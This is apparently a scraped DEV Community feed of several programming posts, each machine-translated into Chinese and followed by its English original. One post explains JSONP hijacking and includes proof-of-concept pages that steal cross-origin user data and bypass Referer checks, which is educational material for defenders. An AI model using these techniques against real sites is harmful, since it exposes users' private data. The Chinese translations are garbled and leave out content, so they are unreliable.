item.title: 这个周末你学到了什么？ | What you learning about this weekend?
item.description:
你好🤠

大家都在学什么？

无论您是在提高您的 JS 技能、为您选择的 OSS 存储库制作 PR、整理您的作品集，还是在此处撰写有关 DEV 的新文章，我们都想听听。

知识就是力量！

一旦被暂停，codenewbieteam 将无法发表评论或发布帖子，直到其暂停被解除。

一旦解除暂停，codenewbieteam 将能够再次发表评论和发布帖子。

一旦取消发布，codenewbieteam 的所有帖子都将被隐藏，只有他们自己才能访问。

如果 codenewbieteam 没有被暂停，他们仍然可以从仪表板重新发布帖子。

笔记：

感谢您保证 DEV 社区的安全。 您可以执行以下操作来标记 codenewbieteam：

使 codenewbieteam 的所有帖子不那么明显

举报其他不当行为

取消标记 codenewbieteam 将恢复其帖子的默认可见性。



原文:

Howdy 🤠

What's everybody been learning?

Whether you're sharpening your JS skills, making PRs to your OSS repo of choice 😉, sprucing up your portfolio, or writing a new post here on DEV, we'd like to hear about it.

Knowledge is power!

Once suspended, codenewbieteam will not be able to comment or publish posts until their suspension is removed.

Once unsuspended, codenewbieteam will be able to comment and publish posts again.

Once unpublished, all posts by codenewbieteam will become hidden and only accessible to themselves.

If codenewbieteam is not suspended, they can still re-publish their posts from their dashboard.

Note:

Thanks for keeping DEV Community safe. Here is what you can do to flag codenewbieteam:

Make all posts by codenewbieteam less visible

codenewbieteam consistently posts content that violates DEV Community's code of conduct because it is harassing, offensive or spammy.

Report other inappropriate conduct

Unflagging codenewbieteam will restore default visibility to their posts.

item.title: 浅谈JSONP劫持漏洞 | Talking about JSONP Hijacking Vulnerability
item.description:
由于浏览器同源策略的限制，浏览器只允许XmlHttpRequest请求当前相同（域名、协议、端口）的资源，对请求脚本资源没有限制。

原理：客户端通过请求脚本标签发送跨域请求，然后服务器输出JSON数据并执行回调函数。 这种跨域数据输出方式称为JSONP。 简单原理说明：使用

可能造成的危险

  • 没有过滤导致的回调xss

例如aphp.test/jsonp/test_jsonp.php ？ 但不幸的是，它只验证关键字 aphp. 测试存在于 Referer 中。
那么攻击者可以构造url： 127.0.0.1/aphp.test.html或127.0.0.1/attack.htm ？ 构造这样的url发起攻击绕过Referer防御

空引用绕过

有时候开发者在过滤的时候会允许Referer来源为空，因为正常情况下浏览器直接访问一个没有Referer的URL，所以我们有时候可以利用这个特性来绕过

# Use the <meta> tag to implement an empty Referer <!DOCTYPE html> <html lang='en'> <head> <meta name="referrer" content="never" charset="utf-8"> <title>jsonp without Referer</title> </head> <body> jsonp without Referer hijacking test </body> <script> function jsonCallback(data){ alert(JSON.stringify(data)); } </script> <script src="http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback"></script> </html>
 # Use the <iframe> tag to call the javscript pseudo-protocol to implement an empty Referer call JSON file <!DOCTYPE html> <html lang='en'> <head> <title>jsonp without Referer</title> </head> <body> jsonp without Referer hijacking test </body> <iframe src="javascript:'<script>function jsonCallback(data){alert(JSON.stringify(data));}</script> <script src=http://aphp.test/jsonp/test_jsonp.php? callback=jsonCallback></script>'" frameborder="0"></iframe> </html>

回调可以定义引起的安全问题
一般开发中，前端可以很方便调用，一般输出Callback都是可定制的，如果过滤不严格，或者Content-Type设置不合适，就会导致xss

注意：严格来说，如果输出数据也是攻击者可控的话，也可能会造成危害，但是本文强调的是Callback Test一段代码的输出点，如下



原文:

The full name of JSONP is JSON with Padding, a solution based on JSON format to solve cross-domain request resources.

Due to the limitation of the browser's same-origin policy, the browser only allows XmlHttpRequest to request resources with the same current (domain name, protocol, port), and there is no restriction on requesting script resources.

Principle: The client sends a cross-domain request through the request script tag, and then the server outputs JSON data and executes the callback function. This cross-domain data output method is called JSONP. Simple principle description: use

Hazards that can be caused

  • JSONP data hijacking
  • callback xss caused by no filtering

JSONP Hijacking Example 

# Server request address: http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback
<?php
header('Content-type: application/json');
$callback = htmlspecialchars($_REQUEST['callback']);
if (!isset($callback) || empty($callback)) {
    $callback = 'callback';
}
$data = array('username'=>'Pmeow-phpoop','email' => '3303003493@google.com');
$json = json_encode($data);
echo $callback."(".$json.")";


# Client request address: http://127.0.0.1/jsonp/jsonp_test.html
<!DOCTYPE html>
<html lang='en'>
<head>
    <title>jsonp</title>
</head>
<body>
    jsonp hijack test
</body>
    <script>
        function jsonCallback(data){
            alert(JSON.stringify(data));
        }
    </script>
    <script src="http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback"></script>
</html>

JSONP hijacking bypass method

Referer filtering (regular) is not rigorous
for example aphp.test/jsonp/test_jsonp.php? callback=jsonCallback When outputting data, the Referer is verified

But unfortunately, it only verifies whether the keyword aphp. test exists in the Referer.
Then the attacker can construct the url: 127.0.0.1/aphp.test.html or 127.0.0.1/attack.htm? aphp.test

Construct such a url to launch an attack to bypass the Referer defense

Empty Referer bypass

Sometimes developers will allow the Referer source to be empty when filtering because under normal circumstances, the browser directly accesses a URL without a Referer, so we can sometimes use this feature to bypass

# Use the <meta> tag to implement an empty Referer
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta name="referrer" content="never" charset="utf-8">
    <title>jsonp without Referer</title>
</head>
<body>
    jsonp without Referer hijacking test
</body>
    <script>
        function jsonCallback(data){
            alert(JSON.stringify(data));
        }
    </script>
    <script src="http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback"></script>
</html>

# Use the <iframe> tag to call the javscript pseudo-protocol to implement an empty Referer call JSON file
<!DOCTYPE html>
<html lang='en'>
<head>
    <title>jsonp without Referer</title>
</head>
<body>
    jsonp without Referer hijacking test
</body>
    <iframe src="javascript:'<script>function jsonCallback(data){alert(JSON.stringify(data));}</script> <script src=http://aphp.test/jsonp/test_jsonp.php? callback=jsonCallback></script>'" frameborder="0"></iframe>
</html>

The callback can define the security problem caused
In general development, the front-end can be easily called, and the general output Callback is customizable, which leads to xss if the filtering is not strict, or if the Content-Type is not set properly

Note: Strictly speaking, if the output data is also controllable by the attacker, it may also cause harm, but this article emphasizes the output point of Callback Test a piece of code as follows
item.author: tutorialboy

item.title: 数字高速公路之旅🛣️🗺️：数据📑如何从您的笔记本电脑💻传输到您朋友的笔记本电脑🙋‍♂️：深入探讨。 | Journey Through the Digital Highway🛣️🗺️: How Data📑 Travels From Your Laptop💻 to Your Friend's Laptop🙋‍♂️: Deep Dive.
item.description:
塔尼什莫汉塔

发表于 7 月 22 日

这部分（第一段）只要读一遍，下面你就会深入理解。

想象一下，互联网就像一个庞大的高速公路系统，而互联网骨干网是连接主要城镇的主要高速公路。 这些高速公路（骨干网）对于不同地区之间快速高效的通信至关重要。


示例(Note: Just read it once, you will get it below)

  • 高速公路系统（互联网） ：互联网就像一个高速公路网络，允许数据（流量）在不同地点（网站、服务器、计算机等）之间流动。
  • 主要高速公路（互联网骨干网） ：互联网骨干网就像该系统中的主要高速公路。 它们是由光纤电缆制成的大型高容量数据传输线，连接全球主要城市和数据中心。
  • 数据传输（互联网流量） ：电子邮件、网页、视频等数据沿着这些主要高速公路（骨干网）传输，快速高效地到达目的地。
  • 区域道路（互联网服务提供商 - ISP） ：数据在某些点离开互联网骨干网并进入互联网服务提供商 (ISP) 的网络。 这些 ISP 就像连接小城镇和社区与主要高速公路的区域道路。 它们充当用户访问互联网的网关。
  • 本地街道（最终用户） ：数据从 ISP 进一步分发给最终用户（例如您和您的朋友）。 这些最终用户就像数据到达最终目的地的当地街道。

您的笔记本电脑💻：您从笔记本电脑发送数据。

  • 该塔可作为您的笔记本电脑连接到 Airtel 蜂窝网络的接入点。

  • 区域（本地网络 - T -> T -> R -> R -> R）：从 Airtel 塔 (T)，数据可以无线传输到附近的下一个 Airtel 塔 (T)。 此过程可能涉及regional area内的多个塔到塔跳 (T -> T)，从而扩展Airtel network的覆盖范围（可以有 n 个 T 和 R）。

  • 互联网网关 (Airtel-R)：数据从 Airtel 路由器 (R) 转发到Airtel internet gateway 。 互联网网关充当Airtel's local network和broader internet (main highway)之间的连接点。 互联网骨干网（主干道）：经过Airtel's internet gateway后，数据进入互联网骨干网（主干道）。 它通过Tata Communications 、 Google 、 Level 3 Communications等多家公司运营的高容量数据传输线路（例如fiber-optic cables ）进行传输。 这些主干网构成了全球互联网的核心基础设施。

  • 互联网路由器（各种提供商）：当数据通过internet backbone(main highway)传输时，它会遇到由各种 ISP 和网络提供商运营的internet routers ，包括上面提到的那些（如Tata Communications 、 Google 、 Level 3 Communications ）。 这些路由器将数据包引导至预期目的地，引导它们通过互连路径的复杂网络。

  • 此转换涉及路由器和其他网络组件来引导数据更接近其最终目的地。

  • 您朋友的笔记本电脑💻：最后，数据到达您朋友的笔记本电脑，由他们的计算机或设备接收和处理，使他们能够阅读电子邮件或与您发送的数据进行交互。

    • 这里是海底Internet Backbone （主要高速公路）的演示。类似地，陆地上也有互联网骨干网。

    总而言之，数据📑是通过电磁波在区域内的塔（T）之间传输的。 一旦到达最后一个塔，它就会被传递到 Airtel 路由器 (R)，然后转发到互联网网关并进入主互联网骨干网。 从那里，它通过互联网路由器网络并最终到达目的地，即您朋友的笔记本电脑。 直到下一次。 快乐学习😃！！！.

    如果您喜欢这篇文章，请点赞💖。

    一旦被暂停，tanishtt 将无法发表评论或发布帖子，直到其暂停被取消。

    一旦解除暂停，tanishtt 将能够再次发表评论和发布帖子。

    一旦取消发布，tanishtt 的所有帖子都将被隐藏，只有他们自己才能访问。

    如果 tanishtt 没有被暂停，他们仍然可以从仪表板重新发布帖子。

    笔记：

    感谢您保证 DEV 社区的安全。 您可以执行以下操作来标记 tanishtt：

    使 tanishtt 的所有帖子不那么明显

    举报其他不当行为

    取消标记 tanishtt 将恢复其帖子的默认可见性。



    原文:

    tanishmohanta

    Posted on Jul 22

     

    Just read this part (first paragraph) once, below you will understand in deep.

    Imagine that the internet is like a vast highway system, and internet backbones are the main highways that connect major cities and towns. These highways (backbones) are essential for fast and efficient communication between different regions.


    Example: (Note: Just read it once, you will get it below)

    • Highway System (Internet): The internet is like a network of highways that allows data (traffic) to flow between various locations (websites, servers, computers, etc.).
    • Main Highways (Internet Backbones): Internet backbones are like the main highways in this system. They are large, high-capacity data transmission lines made of fiber-optic cables that connect major cities and data centers worldwide.
    • Data Transmission (Internet Traffic): Data, such as emails, web pages, videos, and more, travels along these main highways (backbones) to reach its destination quickly and efficiently.
    • Regional Roads (Internet Service Providers - ISPs): The data leaves the internet backbone at certain points and enters the networks of Internet Service Providers (ISPs). These ISPs are like the regional roads that connect smaller towns and communities to the main highways. They serve as the gateways for users to access the internet.
    • Local Streets (End Users): From the ISPs, the data is further distributed to end users (like you and your friend). These end users are like local streets where the data reaches its final destination.

    📌Here's the explaination of the data transfer🗺️:

    1. Your Laptop💻: You send data from your laptop.

    2. Airtel Network (Airtel Tower - T)🗼: The data is transmitted wirelessly from your laptop using electromagnetic waves to the nearest Airtel tower (T). The tower serves as an access point for your laptop to connect to the Airtel cellular network.

    3. Regional Area (Local Network - T -> T -> R -> R -> R): From the Airtel tower (T), the data may be transmitted wirelessly to the next nearby Airtel tower (T). This process can involve several tower-to-tower hops (T -> T) within the regional area, extending the coverage of the Airtel network (There can be n number of T's and R's).

    4. Airtel Router (R): Once the data reaches the last tower in the regional area, it is handed off to an Airtel router (R). Airtel routers are typically located at central facilities, network exchanges, or data centers.

    5. Internet Gateway (Airtel - R): From the Airtel router (R), the data is then forwarded to the Airtel internet gateway. The internet gateway serves as the connection point between Airtel's local network and the broader internet (main highway).(Regional Area of Airtel ISP ends here !!!.)`

    6. Internet Backbone (Main Highway): After passing through Airtel's internet gateway, the data enters the internet backbone (main highway). It travels through high-capacity data transmission lines (e.g., fiber-optic cables) operated by various companies like Tata Communications, Google, Level 3 Communications, and others. These backbones form the core infrastructure of the global internet.

    7. Internet Routers (Various Providers): As the data travels through the internet backbone(main highway), it encounters internet routers operated by various ISPs and network providers, including those mentioned above(like Tata Communications, Google, Level 3 Communications). These routers direct the data packets toward their intended destination, guiding them through the complex network of interconnected pathways.

    8. Jio Network (Regional Area - Destination Area): As the data approaches its destination area (e.g., your friend's location served by Jio), it will leave the internet backbone and enter Jio's network (regional area). This transition involves routers and other network components to guide the data closer to its final destination.

    9. Jio Tower (Jio Access Point)🗼: From the network, the data may be transmitted wirelessly through the air via Jio's tower, which acts as an access point for mobile devices to connect to the Jio network.

    10. Your Friend's Laptop💻: Finally, the data reaches your friend's laptop, where it is received and processed by their computer or device, enabling them to read the email or interact with the data you sent.

    Here's a demonstration of undersea Internet Backbone(main highway).In similar way, there are also Internet Backbone on land.

    In summary, data📑 is transferred through electromagnetic waves between the towers (T) within the regional area. Once it reaches the last tower, it is then passed to an Airtel router (R) before being forwarded to the internet gateway and entering the main internet backbone. From there, it goes through a network of internet routers and eventually reaches the destination, your friend's laptop. Until next time. Happy Learning😃 !!!.

    If you liked the article, do hit like💖.

item.title: GitHub Insider：每月一次通往卓越开发者之路！ | GitHub Insider: Your Monthly Gateway to Developer Excellence!
item.description:
米切尔·穆坦达

发表于 7 月 22 日

所有开发商请注意！ 我有一些令人振奋的消息要与大家分享。 这份独家摘要包含大量宝贵的见解、技术技巧和专家实践，可激发您的编码热情。

探索 GitHub 内幕：

向 GitHub Insider 打个招呼，这是您通往开发者仙境的终极指南。 每个月，这个宝库都会让您深入了解 GitHub 的创新产品，揭开它们隐藏的瑰宝。 除此之外，您还会发现精心策划的技术指南和最佳实践集合，为您的编码之旅提供支持。

成为魔法的一部分：

加入蓬勃发展的开发者社区，利用内部知识和行业最佳实践来提升您的技能。

不要错过这个增强编码能力的黄金机会。 拥抱 GitHub Insider，在不断发展的开发世界中保持领先地位。 立即注册并解锁通往卓越开发人员的大门！

item.title: 什么是执行上下文 | Execution Context in JS JS 中的执行上下文 | What is Execution Context | Execution Context in JS
item.description:
迪瓦卡卡什亚普

发表于 7 月 22 日

在 JavaScript 中，“执行上下文”是一个基本概念，有助于管理代码的执行。 它可以被认为是评估和执行代码的环境。 每当 JavaScript 程序运行时，它都会创建一个或多个执行上下文，每个执行上下文代表一个特定的范围、一组变量以及代码执行方式的规则。

为了用简单的语言来理解，想象一下你的 JavaScript 代码就像一场戏剧，而执行上下文就像表演戏剧的舞台。

执行上下文是您的代码发挥作用的地方。 当所有字符（变量）及其相互作用时，它会跟踪它们的行（值）。 每次调用函数或执行代码时，都会在舞台上建立一个新的性能（执行上下文）。

该阶段也了解其他阶段，因此如果一个功能需要另一个功能的某些内容，它们可以相互通信。

当一个函数完成其表演时，舞台就被清理干净，下一个函数就准备好轮到它了。

这样，代码的每个部分都有自己的阶段（执行上下文），并且它们不会干扰彼此的性能。 就像一场精心组织的戏剧演出，确保一切顺利进行，没有任何混乱！

感谢您的阅读，请在 Twitter 上关注我，我定期分享有关 Javascript 和 React 的内容并为开源项目做出贡献

推特- twitter.com/Diwakar_766

穆罕默德·阿尤布·阿卢安 - 7 月 16 日

原文:

DIWAKARKASHYAP

Posted on Jul 22

 

In JavaScript, the "execution context" is a fundamental concept that helps to manage the execution of code. It can be thought of as an environment in which the code is evaluated and executed. Whenever a JavaScript program runs, it creates one or more execution contexts, each representing a particular scope, set of variables, and the rules for how the code is executed.

To understand in easy language, imagine your JavaScript code is like a play, and the execution context is like the stage where the play is performed.

The execution context is where your code comes to life. It keeps track of all the characters (variables) and their lines (values) as they interact with each other. Each time a function is called or code is executed, a new performance (execution context) is set up on the stage.

This stage knows about other stages too, so if one function needs something from another function, they can talk to each other.

When a function finishes its performance, the stage is cleared, and the next one gets ready for its turn.

This way, each part of your code gets its own stage (execution context), and they don't interfere with each other's performance. It's like a well-organized theater production, making sure everything runs smoothly and without any chaos!

item.title: 为什么 Valgrind 是比 macOS 中的内存泄漏更好的内存泄漏检测工具 | Why Valgrind is a Better Tool for Detecting Memory Leaks than Leak in macOS
item.description:
夜鸟07

发表于 7 月 22 日

内存泄漏是 C/C++ 程序中错误和崩溃的常见来源。 在开发过程中检测内存泄漏至关重要，旧版 macOS 版本 (macOS 10.x) 上内存泄漏检测的两个主要选项是 Valgrind 和 Leak Sanitizer。

瓦尔格林德：

  • 它使用动态二进制检测在运行时监视程序。
  • 例子：

    这是一个泄漏内存的简单 C++ 程序：

     #include <iostream> int main() { int* x = new int; std::cout << *x; // x is leaked here }

    当通过 Valgrind 运行该程序时，它会生成以下泄漏报告：

     ==123== 4 bytes in 1 blocks are definitely lost in loss record 1 of 1 ==123== at 0x100000F3F: operator new(unsigned long) (in /usr/lib/libc++abi.dylib) ==123== by 0x100000DEA: main (main.cpp:4)

    示例结束

    • 泄漏消毒剂：

      • 它是通过使用-fsanitize=address选项构建程序来启用的。

      例子：

      要为前面的示例启用 Leak Sanitizer，您可以使用以下命令对其进行编译：

       clang++ -fsanitize=address -g -o my_program my_program.cpp

      运行程序时，Leak Sanitizer 将提供类似于以下内容的报告：

       LeakSanitizer: detected memory leaks Direct leak of 4 byte(s) in 1 object(s) allocated from: #0 0x7fff8939066f in operator new(unsigned long) ../.././libc++abi.dylib (inline) #1 0x100000dea8 in main main.cpp:4 #2 0x7fff50bbcdc9 in start (libdyld.dylib) SUMMARY: LeakSanitizer: 4 byte(s) leaked in 1 allocation(s).

      示例结束

      • 它在进程退出时提供基本的内存泄漏报告，包括泄漏的内存范围。
      • 与 Valgrind 相比，Leak Sanitizer 的运行时开销更低，因此程序执行速度更快。

      为什么 Valgrind 更适合 macOS 10.x 上的内存泄漏检测：

      • 它支持内存分析，允许分析总体内存使用情况并识别其他问题。
      • 然而，其丰富的分析功能通常使得这种权衡是值得的，特别是在积极的开发过程中。 对于较长的运行或生产分析，Leak Sanitizer 可以补充 Valgrind 以减少性能影响。 总体而言，Valgrind 仍然是旧 macOS 版本上进行详细内存调试的更好选择。

迈克尔·萨林顿 - 7 月 11 日

一旦被暂停，nightbird07 将无法发表评论或发布帖子，直到其暂停被解除。

一旦解除暂停，nightbird07 将能够再次发表评论和发布帖子。

一旦取消发布，nightbird07 的所有帖子都将被隐藏，只有他们自己才能访问。

如果 nightbird07 没有被暂停，他们仍然可以从仪表板重新发布帖子。

笔记：

感谢您保证 DEV 社区的安全。 您可以执行以下操作来标记 nightbird07：

使 nightbird07 的所有帖子不那么明显

举报其他不当行为

取消标记 nightbird07 将恢复其帖子的默认可见性。



原文:

NightBird07

Posted on Jul 22

 

Memory leaks are a common source of bugs and crashes in C/C++ programs. Detecting memory leaks during development is critical, and two main options for memory leak detection on older macOS versions (macOS 10.x) are Valgrind and Leak Sanitizer.

Valgrind:

  • Valgrind is an open-source debugging and profiling tool for Linux, macOS, and Unix-like systems.
  • It uses dynamic binary instrumentation to monitor programs at runtime.
  • Valgrind can perform a range of memory debugging tasks, including detecting memory leaks, reads of uninitialized memory, double frees, and more.

Example:

Here is a simple C++ program that leaks memory:

#include <iostream>

int main() { int* x = new int; std::cout << *x; // x is leaked here
}

When running this program through Valgrind, it generates the following leak report:

==123== 4 bytes in 1 blocks are definitely lost in loss record 1 of 1
==123== at 0x100000F3F: operator new(unsigned long) (in /usr/lib/libc++abi.dylib)
==123== by 0x100000DEA: main (main.cpp:4)

Valgrind accurately pinpoints the source of the leak at line 4 and provides the allocation size.

End of Example

  • Valgrind provides extensive memory usage information, including detailed call stacks for leaked allocations.
  • One of the key advantages of Valgrind is that it works on existing executables without recompiling the source code.

Leak Sanitizer:

  • Leak Sanitizer is part of the Address Sanitizer feature in LLVM compiler infrastructure.
  • It is enabled by building programs with the -fsanitize=address option.

Example:

To enable Leak Sanitizer for the previous example, you would compile it with the following command:

clang++ -fsanitize=address -g -o my_program my_program.cpp

When running the program, Leak Sanitizer would provide a report similar to the following:

LeakSanitizer: detected memory leaks
Direct leak of 4 byte(s) in 1 object(s) allocated from:
#0 0x7fff8939066f in operator new(unsigned long) ../.././libc++abi.dylib (inline)
#1 0x100000dea8 in main main.cpp:4
#2 0x7fff50bbcdc9 in start (libdyld.dylib)

SUMMARY: LeakSanitizer: 4 byte(s) leaked in 1 allocation(s).

End of Example

  • Leak Sanitizer tracks memory allocation and release during program execution.
  • It provides basic memory leak reports at process exit, including memory ranges of leaks.
  • Leak Sanitizer has lower runtime overhead compared to Valgrind, resulting in faster program execution.

Why Valgrind is Better for Memory Leak Detection on macOS 10.x:

  • Valgrind provides more detailed memory information, including exact stack traces and allocation sizes.
  • It supports memory profiling, allowing analysis of overall memory usage and identification of other issues.
  • Valgrind actively tracks memory state during execution, catching issues more accurately.
  • Valgrind integrates well with debugging tools like GDB for easy inspection of issues.

The main downside of Valgrind is its performance overhead, as programs run slower under Valgrind. However, its rich analysis capabilities usually make this tradeoff worthwhile, especially during active development. For longer runs or production profiling, Leak Sanitizer can complement Valgrind to reduce performance impact. Overall, Valgrind remains the better choice for detailed memory debugging on older macOS versions.

Michael Tharrington - Jul 11

item.title: 作为非英语母语人士拥抱科技行业 | Embracing the Tech Industry as a Non-Native English Speaker
item.description:
沙米姆沙里菲

发表于 7 月 22 日

  • 简介：无论母语是什么，进入科技行业都可能是一次令人兴奋且有益的旅程。 虽然英语通常被认为是科技界的通用语言，但作为非英语母语人士不应阻止有抱负的专业人士。 事实上，它可以带来独特的视角、文化多样性和创新的解决问题的能力。 该博客探讨了非英语母语人士如何在科技行业蓬勃发展，并为克服语言障碍提供了宝贵的见解。

  1. 强调您独特的技能：
    作为非英语母语人士，您拥有一项宝贵的资产：多元化的技能。 突出显示您对多种语言的流利程度，因为它展示了您的适应能力和对全球市场的理解。 此外，在与国际团队合作或服务不同的用户群时，双语或多语可能会很有优势。 重点展示您的技术专业知识、解决问题的能力和创造性思维，因为无论使用何种语言，这些技能在科技行业都受到高度重视。

  2. 提高您的英语语言技能：
    虽然熟练掌握英语是有益的，但不断提高语言技能也至关重要。 花时间进行语言学习和练习。 参与英语对话、阅读技术文章和观看视频，以增强您的词汇量和理解力。 在线语言学习平台、语言交换项目和专业语言课程可以提供结构化的学习机会。 此外，让自己周围都是说英语的人，或者加入技术相关的社区，在那里你可以在现实生活场景中练习你的语言技能。

  3. 利用跨文化交流
    精通多种语言使您能够弥合文化差距并促进不同技术团队之间的有效沟通。 在合作开展全球项目或满足国际用户群的需求时，您理解不同文化细微差别的能力可能是一笔宝贵的资产。 拥抱您的文化背景，并通过带来独特的见解和创新的方法来解决问题，从而利用它来发挥您的优势。 庆祝科技行业的多样性并促进包容性。

  4. 建立强大的专业网络：网络在科技行业中发挥着至关重要的作用，为学习、协作和职业发展提供了机会。 参加行业活动、加入在线社区并参加论坛，与来自不同背景的专业人士建立联系。 利用您的语言技能发起对话、分享知识并建立有意义的联系。 寻找能够指导您完成职业生涯并提供宝贵建议的导师。 请记住，人脉网络不仅限于英语圈子；还包括英语圈子。 用您的母语建立的联系也同样有价值。 结论 ）：

    作为非英语母语人士从事科技行业的职业可能是一次有益的经历。 通过强调您独特的技能、不断提高您的语言能力、利用跨文化交流以及建立强大的专业网络，您可以蓬勃发展并为该领域做出重大贡献。 科技行业因多元化而蓬勃发展，欢迎来自不同语言背景的个人。 发挥你的优势，培养你的技能，抓住未来的机会。 您在科技行业的旅程不会受到语言障碍的限制，而是会受到您对技术的决心和热情的支持。

萨蒂什库马尔·巴拉钱德兰 - 7 月 22 日

原文:

shamimsharifi

Posted on Jul 22

  • Introduction: Entering the tech industry can be an exciting and rewarding journey, regardless of one's native language. While English is often considered the lingua franca of the tech world, being a non-native English speaker should not discourage aspiring professionals. In fact, it can bring unique perspectives, cultural diversity, and innovative problem-solving skills. This blog explores how non-native English speakers can thrive in the tech industry and provides valuable insights for overcoming language barriers.

  1. Emphasize Your Unique Skill Set:
    As a non-native English speaker, you possess a valuable asset: your diverse skill set. Highlight your fluency in multiple languages, as it demonstrates adaptability and an understanding of global markets. Moreover, being bilingual or multilingual can be advantageous when collaborating with international teams or serving a diverse user base. Focus on showcasing your technical expertise, problem-solving abilities, and creative thinking, as these skills are highly valued in the tech industry irrespective of language.

  2. Improve Your English Language Skills :
    While proficiency in English is beneficial, it's crucial to continually improve your language skills. Dedicate time to language learning and practice. Engage in conversations, read technical articles, and watch videos in English to enhance your vocabulary and comprehension. Online language learning platforms, language exchange programs, and professional language courses can provide structured learning opportunities. Additionally, surround yourself with English speakers or join tech-related communities where you can practice your language skills in real-life scenarios.

  3. Leverage Cross-Cultural Communication
    Being fluent in multiple languages enables you to bridge cultural gaps and foster effective communication within diverse tech teams. Your ability to understand different cultural nuances can be a valuable asset when collaborating on global projects or addressing the needs of an international user base. Embrace your cultural background and use it to your advantage by bringing unique insights and innovative approaches to problem-solving. Celebrate diversity and promote inclusivity within the tech industry.

  4. Build a Strong Professional Network : Networking plays a vital role in the tech industry, providing opportunities for learning, collaboration, and career advancement. Attend industry events, join online communities, and participate in forums to connect with professionals from diverse backgrounds. Leverage your language skills to initiate conversations, share knowledge, and establish meaningful connections. Seek out mentors who can guide you through your career journey and offer valuable advice. Remember, networking is not limited to English-speaking circles; connections made in your native language can be equally valuable. Conclusion ):

    Embracing a career in the tech industry as a non-native English speaker can be a rewarding experience. By emphasizing your unique skill set, continuously improving your language abilities, leveraging cross-cultural communication, and building a strong professional network, you can thrive and make significant contributions to the field. The tech industry thrives on diversity and welcomes individuals from all linguistic backgrounds. Embrace your strengths, cultivate your skills, and seize the opportunities that lie ahead. Your journey in the tech industry is not limited by language barriers, but rather empowered by your determination and passion for technology.

sathishkumar balachandran - Jul 22

Bimsara Hirushan - Jul 22

item.title: Git Cheatsheet 将使您成为 Git 大师 | Git Cheatsheet that will make you a master in Git
item.description:
塞缪尔·埃比尼泽

发表于 7 月 22 日

它已成为管理代码更改的重要工具，无论是单独工作还是在团队中工作。 然而，掌握 Git 可能是一个挑战，特别是对于不熟悉其命令和功能的初学者来说。 在此 Git 备忘单中，我们将介绍每个开发人员都应该了解的基本和高级 Git 命令。 从创建存储库到分支、合并等，此备忘单将为任何希望提高 Git 技能并成为更熟练的开发人员的人提供方便的参考指南。 无论您是刚刚开始使用 Git 还是希望增强现有知识，此备忘单都将帮助您充分利用 Git 并优化您的工作流程。

基本的 Git 命令

初始化 要在当前目录中初始化新的 Git 存储库，请运行以下命令：

这会在当前目录中创建一个隐藏的 .git 目录，用于跟踪代码更改。

克隆

要将现有的 Git 存储库克隆到本地计算机，请运行以下命令：

 git clone <repository URL>

这将在您的计算机上创建一个包含存储库副本的新目录。

分期变更

在提交对代码的更改之前，您需要使用 git add 命令暂存它们。 这告诉 Git 您想要在提交中包含哪些更改。 要暂存文件或目录，请运行以下命令：

您还可以通过运行以下命令暂存当前目录中的所有更改：

提交变更

要使用提交消息提交暂存区域中的更改，请运行以下命令：
git commit -m "<commit message>"
提交消息应简要描述您在提交中所做的更改。

检查状态

要检查存储库的当前状态，请运行以下命令：

这将显示哪些文件已被修改、哪些文件已暂存以供提交以及哪些文件未跟踪。

查看更改

要查看工作目录和暂存区之间的变化，请运行以下命令：

要查看暂存区与上次提交之间的变化，请运行以下命令：

分枝

要创建具有指定名称的新分支，请运行以下命令：

要切换到指定分支，请运行以下命令：

 git checkout <branch name>

您还可以通过运行以下命令在一个命令中创建并切换到新分支：

 git checkout -b <branch name>

要将指定分支合并到当前分支，请运行以下命令：

推送更改 要将更改推送到远程存储库，请运行以下命令：

 git push <remote> <branch>

是远程存储库的名称，是要推送的分支的名称。

拉动变更

要从远程存储库中提取更改，请运行以下命令：

 git pull <remote> <branch>

是远程存储库的名称，也是要拉取的分支的名称。

查看历史记录

要查看提交历史记录，请运行以下命令：

这将向您显示存储库中所有提交的列表，以及提交消息、作者和日期。

高级 Git 命令

恢复更改
如果需要撤消提交，可以使用 git revert 命令。 这将创建一个新的提交，撤消在指定提交中所做的更改。

重置更改

如果您想撤消某个提交并将其从提交历史记录中删除，可以使用 git reset 命令。 这将从提交历史记录中删除指定的提交和所有后续提交。 要使用 --soft 重置上次提交，请运行以下命令： git reset --soft HEAD~1 要使用 --mixed 重置上次提交，请运行以下命令： git reset --mixed HEAD~1 要使用 --hard 重置上次提交，请运行以下命令：

变基

如果要将更改应用到不同的分支，可以使用 git rebase 命令。 此命令将您的更改应用到指定分支之上。 要将当前分支变基到指定分支，请运行以下命令：

藏匿

如果您想保存更改而不提交它们，可以使用 git stash 命令。 这会将更改保存在临时提交堆栈中，允许您切换到不同的分支或处理其他事情。 要存储更改，请运行以下命令：

要再次应用更改，请运行以下命令：

此命令将指定的提交应用于当前分支之上。 要挑选指定的提交，请运行以下命令：

 git cherry-pick <commit hash>

要创建自定义 Git 挂钩，请导航到 Git 存储库中的 .git/hooks 目录，并使用要创建的挂钩名称（例如，预提交、合并后）创建一个新文件。 该文件应该是可执行的并包含您要运行的脚本。

您可以使用 git config 命令创建自己的自定义别名。 要创建新别名，请运行以下命令：git config --global alias。 是您要创建的别名的名称，也是您要为其设置别名的 Git 命令。

有几种流行的 Git 工作流程，包括集中式工作流程、功能分支工作流程和 Gitflow 工作流程。 集中式工作流程是一个简单的工作流程，涉及单个主分支，所有更改都直接对该分支进行。 功能分支工作流程涉及为每个功能或错误修复创建一个新分支，并在更改完成后将这些分支合并回主分支。

结论

总之，Git 是用于版本控制和管理代码更改的强大工具。 它允许开发人员在项目上进行协作、跟踪更改并在必要时恢复到以前的版本。 虽然基本的 Git 命令是必须了解的，但本备忘单中讨论的高级 Git 命令可以帮助您在使用 Git 时更加高效和有效。

原文:

Samuel Ebenezer

Posted on Jul 22

 

Git is a widely used version control system that allows developers to track changes and collaborate on projects. It has become an essential tool for managing code changes, whether working solo or in a team. However, mastering Git can be a challenge, especially for beginners who are not familiar with its commands and features. In this Git cheatsheet, we will cover both the basic and advanced Git commands that every developer should know. From creating a repository to branching, merging, and beyond, this cheatsheet will serve as a handy reference guide for anyone looking to improve their Git skills and become a more proficient developer. Whether you are just starting with Git or looking to enhance your existing knowledge, this cheatsheet will help you make the most out of Git and optimize your workflow.

Basic Git commands

